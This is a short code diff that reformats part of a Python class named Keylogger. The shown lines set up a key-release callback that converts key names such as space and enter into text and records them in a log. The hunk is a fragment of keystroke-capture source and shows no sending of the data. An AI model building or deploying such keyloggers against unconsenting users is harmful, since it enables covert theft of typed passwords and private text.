@@ -6,20 +6,15 @@ class Keylogger:
     def __init__(self, interval):
         self.interval = interval
         self.log = ""
-        # for blocking after setting the on_release listener
-        self.semaphore = Semaphore(0)
+        self.semaphore = Semaphore(0) # For blocking after setting the on_release listener
 
     def callback(self, event):
         """ This callback is invoked when a key is released """
         name = event.name
-        if len(name) > 1:
-            # not a character, special key (e.g ctrl, alt, etc.)
-            if name == "space":
-                name = " "
-            elif name == "enter":
-                name = "[ENTER]\n"
-            elif name == "decimal":
-                name = "."
+        if len(name) > 1: # Special key (e.g ctrl, alt, etc.)
+            if name == "space":     name = " "
+            elif name == "enter":   name = "[ENTER]\n"
+            elif name == "decimal": name = "."
             else:
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
